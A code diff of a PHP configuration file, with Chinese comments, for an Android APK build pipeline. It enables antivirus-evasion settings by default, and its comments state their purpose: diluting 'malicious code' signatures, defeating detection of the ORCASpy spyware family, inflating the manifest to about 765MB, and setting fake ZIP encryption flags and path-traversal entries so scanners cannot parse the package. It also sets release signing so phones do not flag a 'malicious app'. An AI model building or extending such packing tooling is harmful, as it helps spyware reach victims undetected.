@@ -107,23 +107,90 @@ return [
     */
 
     'protection' => [
-        // 是否启用垃圾类生成
-        'enable_junk_classes' => (bool) env('APK_ENABLE_JUNK_CLASSES', false),
+        // 生成垃圾 Smali 类，增加 DEX 噪音，稀释恶意代码特征密度
+        // 三层分布：应用包名层 + handler/verifier 层 + 随机包名层
+        'enable_junk_classes' => (bool) env('APK_ENABLE_JUNK_CLASSES', true),
 
-        // 是否启用类名混淆
-        'enable_class_shuffle' => (bool) env('APK_ENABLE_CLASS_SHUFFLE', false),
+        // 重命名 Smali 类名（65 个目标类 → 随机小写字母名）
+        // 同步更新 AndroidManifest.xml 中的组件引用
+        'enable_class_shuffle' => (bool) env('APK_ENABLE_CLASS_SHUFFLE', true),
 
-        // 是否启用 APK 保护（ZIP 注释注入）
-        'enable_apk_protection' => (bool) env('APK_ENABLE_PROTECTION', false),
+        // 替换 Smali 中的字符串变量名（100 个目标 → 随机名）
+        'enable_string_obfuscation' => (bool) env('APK_ENABLE_STRING_OBFUSCATION', true),
 
-        // 是否启用 DEX 修改
-        'enable_dex_modification' => (bool) env('APK_ENABLE_DEX_MODIFICATION', false),
+        // APK 保护总开关，启用后执行：
+        //   1. inflate_manifest — 膨胀 AndroidManifest.xml 至 ~765MB，阻止 AV 解析
+        //   2. apk_editor — APKEditor 重打包优化 ZIP 结构
+        //   3. protect_apk — 假加密标志 + ZIP 条目保护
+        'enable_apk_protection' => (bool) env('APK_ENABLE_PROTECTION', true),
 
-        // 垃圾类数量
-        'junk_class_count' => (int) env('APK_JUNK_CLASS_COUNT', 50),
+        // 修改 APK 文件头部字节，覆盖 DEX magic/checksum 区域
+        // 必须在 apk_editor 之后执行（APKEditor 会重写文件头）
+        'enable_dex_modification' => (bool) env('APK_ENABLE_DEX_MODIFICATION', true),
 
-        // 每个垃圾类的方法数量
+        // D8 字节码重组：DEX → dex2jar → JAR → D8 → DEX
+        // 往返转换改变寄存器分配和指令排序，破坏 AV 的 ORCASpy 等家族字节码模式签名
+        // 依赖工具：storage/app/apk/tools/r8.jar + tools/dex2jar/
+        'enable_r8_obfuscation' => (bool) env('APK_ENABLE_R8_OBFUSCATION', true),
+
+        // 对 classes*.dex 和 AndroidManifest.xml 的 ZIP Local File Header 设置假加密标志
+        // flag bits OR 0xF741 → 最终 0xff49，阻止 AV 引擎的 ZIP 解析器解压 DEX 内容
+        'enable_fake_encryption' => (bool) env('APK_ENABLE_FAKE_ENCRYPTION', true),
+
+        // 生成路径穿越假 ZIP 条目（如 AndroidManifest.xml///.xml, classes.dex/\\.xml）
+        // 混淆 AV 的文件枚举逻辑，使其无法准确定位真实 DEX/Manifest
+        'enable_path_traversal_entries' => (bool) env('APK_ENABLE_PATH_TRAVERSAL', true),
+
+        // 三层包名分布的垃圾类（应用包名 + handler/verifier + 随机包名）
+        // 与 enable_junk_classes 配合，模拟真实应用的多模块类结构
+        'enable_multi_package_junk' => (bool) env('APK_ENABLE_MULTI_PACKAGE_JUNK', true),
+
+        // ZIP 假条目数量（caobizy.apk 参考值 314，建议 ≥ 300）
+        // 假条目使用真实 Android 资源文件名（abc_*, design_*, mtrl_* 等）
+        'fake_entry_count' => (int) env('APK_FAKE_ENTRY_COUNT', 320),
+
+        // 每层垃圾类数量（总数 = junk_class_count × 3 层）
+        'junk_class_count' => (int) env('APK_JUNK_CLASS_COUNT', 165),
+
+        // 每个垃圾类中的随机方法数量
         'junk_method_count' => (int) env('APK_JUNK_METHOD_COUNT', 10),
+    ],
+
+    /*
+    |--------------------------------------------------------------------------
+    | Signing Settings
+    |--------------------------------------------------------------------------
+    |
+    | APK 签名配置。默认使用 release 模式自动生成正式签名，
+    | 避免 debug 签名触发手机安全扫描的"恶意应用"提示。
+    |
+    | 如果已有正式 keystore，可通过环境变量指定路径和密码。
+    | 否则系统会自动生成一个 release 级别的 keystore 并持久保存。
+    |
+    */
+
+    'signing' => [
+        // 签名模式: 'release'（正式签名）或 'debug'（调试签名，不推荐生产使用）
+        'mode' => env('APK_SIGNING_MODE', 'release'),
+
+        // 用户提供的 Release keystore 配置（优先级最高）
+        'keystore_path' => env('APK_KEYSTORE_PATH'),
+        'keystore_pass' => env('APK_KEYSTORE_PASS'),
+        'key_alias'     => env('APK_KEY_ALIAS'),
+        'key_pass'      => env('APK_KEY_PASS'),
+
+        // 自动生成 keystore 时的参数
+        'auto_generate' => [
+            'key_alg'  => 'RSA',
+            'key_size' => 2048,
+            'validity' => 36500,  // 100 年
+            'dname'    => env('APK_KEYSTORE_DNAME', 'CN=App,OU=Mobile,O=Company,L=City,ST=State,C=CN'),
+        ],
+
+        // 是否启用 APK Signature Scheme v2/v3
+        // 旧版 signapk.jar 使用 --v2-signing-enabled true --v3-signing-enabled false
+        'v2_signing' => true,
+        'v3_signing' => false,
     ],
 
     /*
